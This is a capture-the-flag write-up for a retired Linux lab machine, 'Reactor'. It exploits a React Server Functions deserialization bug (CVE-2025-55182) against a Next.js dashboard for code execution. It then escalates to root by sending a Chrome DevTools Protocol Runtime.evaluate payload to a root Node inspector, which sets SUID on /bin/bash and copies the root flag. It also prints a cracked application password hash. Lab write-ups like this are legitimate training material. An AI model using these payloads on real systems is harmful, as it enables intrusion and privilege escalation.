# Reactor

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--05--23-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | May 23, 2026 |
| **Rating** | 4.1 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A "ReactorWatch" dashboard on port 3000 runs Next.js 15.0.3 with React 19.0.0-rc, vulnerable to **CVE-2025-55182** (React2Shell) — a React Server Functions deserialization bug giving RCE as the `node` user. Root does not need SSH at all: root runs a Node worker with `--inspect=127.0.0.1:9229`, and from the `node` RCE that localhost-only inspector is reachable. Driving the Chrome DevTools Protocol to `Runtime.evaluate` a `child_process.execSync` call yields a SUID root bash.

---

Flags rotate per spawn on this machine.

## Recon

`nmap`: 22 (OpenSSH 7.4), 3000 (Next.js, `X-Powered-By: Next.js`, App Router/RSC). A single dashboard page, "ReactorWatch | Core Monitoring System". Version from wappalyzer and the JS bundles: Next.js 15.0.3, React 19 rc.

## Foothold — CVE-2025-55182 React2Shell (RCE as node)

Vulnerability in React Server Functions deserialization. PoC: [github.com/msanft/CVE-2025-55182](https://github.com/msanft/CVE-2025-55182).

POST to the app root with a `Next-Action: x` header and a crafted multipart chunk whose `_prefix` runs `process.mainModule.require('child_process').execSync(<cmd>)` and returns the output in a `NEXT_REDIRECT` digest.

```bash
python3 poc.py http://<TARGET_IP>:3000 "id"   # uid=999(node)
```

The intended path continues: dump `/opt/reactor-app/reactor.db` (SQLite) → users `admin`/`engineer` with MD5 hashes (`engineer` = `39d97110eafe2a9a68639812cd271e8e` = `reactor1`) — **but SSH is not needed**. `user.txt` is at `/home/node/user.txt`, and in practice it was read via the inspector as root below; the `engineer` credentials are app-database credentials only.

## Privesc — Node `--inspect` debugger (root)

`ps aux` shows:

```
root ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The inspector is localhost-only but reachable from the `node` RCE. Node 20 has no global `WebSocket` and no `ws` module on the box, so use a **dependency-free raw-WebSocket CDP client** (Node `http` upgrade plus a hand-rolled masked frame) to call `Runtime.evaluate`:

```javascript
// GET http://127.0.0.1:9229/json/list -> webSocketDebuggerUrl, then send:
{id:1, method:"Runtime.evaluate", params:{expression:
  "process.mainModule.require('child_process').execSync('chmod u+s /bin/bash; cat /root/root.txt > /home/node/.rr; chmod 666 /home/node/.rr').toString()"}}
```

This runs as root, because the worker is root. Then `/bin/bash -p -c 'cat /root/root.txt'` → root. Both flags are readable this way (`/home/node/.rr`, `/home/*/user.txt`).

Manual alternative, from an `engineer` SSH session with a `-L 9229:127.0.0.1:9229` tunnel:

```bash
node inspect 127.0.0.1:9229
# then:
exec("process.mainModule.require('child_process').execSync('chmod u+s /bin/bash')")
```

## Notes

- Command output from the React2Shell PoC comes back single-line (trimmed) in the digest — use base64, or write to a file, for multi-line or quoted output.
- The `ws`-free CDP client is the key trick when the target's Node lacks a WebSocket library.

## Related

CVE-2025-55182 (React Server Functions RCE) · Node `--inspect` CDP privesc

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
